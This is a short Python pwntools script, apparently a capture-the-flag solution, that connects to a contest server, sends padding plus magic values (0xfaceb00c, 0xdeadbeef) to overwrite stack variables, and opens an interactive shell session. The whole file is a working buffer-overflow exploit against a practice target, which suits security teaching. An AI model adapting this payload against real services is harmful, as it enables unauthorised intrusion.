from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11002
p = remote(host, port)

print(p.recvline())

p.sendline(p32(0x11111111) + p32(0x11111111) + p32(0x11111111) +  p32(0xfaceb00c) + p32(0xdeadbeef) + p32(0x00000001))

p.interactive()

